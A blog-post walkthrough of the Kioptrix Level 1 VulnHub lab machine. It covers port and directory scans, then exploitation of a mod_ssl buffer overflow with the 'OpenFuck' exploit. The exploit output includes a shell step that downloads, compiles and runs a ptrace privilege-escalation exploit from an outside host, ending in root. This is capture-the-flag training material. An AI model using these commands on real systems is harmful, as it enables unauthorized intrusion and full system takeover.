---
layout: post
title:  "Kioptrix Level 1 Walkthrough"
date:   2019-04-09 15:44:02 +0530
categories: [vulnhub, CTF]
---
Kioptrix level 1 is an easy vulnerable machine on vulnhub, link is below:<br>
[Kioptrix Level 1 download page]
<h2>1. Enumeration</h2>
<br>
The port scan below reveals several open ports including SSH, HTTP, RPC, Samba and 443.
{% highlight shell_session %}
nmap -T4 -sV -A -oN nmapscan.txt 192.168.0.66
Nmap scan report for 192.168.0.66
Host is up (0.0054s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MMYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2019-03-28T23:46:31+00:00; +1h01m49s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: mean: 1h01m48s, deviation: 0s, median: 1h01m48s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
{% endhighlight %}<br>

<h3>1.1 OpenSSH port 22</h3>
Using `searchsploit`, there appears to be no known vulnerabilities in the exploit database for OpenSSH.
<br>

<h3>1.2 HTTP port 80</h3>
Running `dirb` reveals several interesting files including:

{% highlight shell_session %}
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbresults.txt
URL_BASE: http://192.168.0.66/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.0.66/ ----
+ http://192.168.0.66/~operator (CODE:403|SIZE:273)
+ http://192.168.0.66/~root (CODE:403|SIZE:269)
+ http://192.168.0.66/cgi-bin/ (CODE:403|SIZE:272)
+ http://192.168.0.66/index.html (CODE:200|SIZE:2890)
==> DIRECTORY: http://192.168.0.66/manual/
==> DIRECTORY: http://192.168.0.66/mrtg/
==> DIRECTORY: http://192.168.0.66/usage/

---- Entering directory: http://192.168.0.66/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.0.66/mrtg/ ----
+ http://192.168.0.66/mrtg/index.html (CODE:200|SIZE:17318)

---- Entering directory: http://192.168.0.66/usage/ ----
+ http://192.168.0.66/usage/index.html (CODE:200|SIZE:3704)

-----------------
DOWNLOADED: 13836 - FOUND: 6
{% endhighlight %}
<br>
The only files that appear to be out of place are `~operator` and `~root`. However, these files appear have
a CODE:403 and cannot be accessed so this is a dead end.

<h3>Port 80 is running:</h3>
-Apache 1.3.20 (Not vulnerable)<br>
-Red-Hat/Linux <br>
-mod_ssl/2.8.4 OpenSSL/0.9.6b<br><br>

Using `searchsploit` to search for these services, `mod_ssl/2.8.4` appears to be Vulnerable
to a remote buffer overflow exploit.
<br>
<h2>2. Exploitation</h2>
Exploiting the `mod_ssl/2.8.4` vulnerability:<br>
The exploit, remote buffer overflow named 'OpenFuck' and 'OpenFuckv2' appears
to be out date. However, i found a patched version of the exploit on Github linked below:<br>
[Fixed alternative version of 'OpenFuck' Github]
<br><br>
Executing the exploit:
<br>
The parameters are passed (version: 0x6b, IP address: 192.168.0.66 and open N connections: -c 50) <br>
{% highlight shell_session %}
./OpenFuckExploit 0x6b 192.168.0.66 -c 50

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304-
--11:16:09--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--11:16:10--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   1.87 MB/s

11:16:10 (1.25 MB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 7066
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
whoami
root
{% endhighlight %}<br>
<h2>3. Root access gained!</h2>
The `uid` and `whoami` command shows root access to the system using the OpenFuck exploit.



[Kioptrix Level 1 download page]: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
[Fixed alternative version of 'OpenFuck' Github]: https://github.com/heltonWernik/OpenLuck
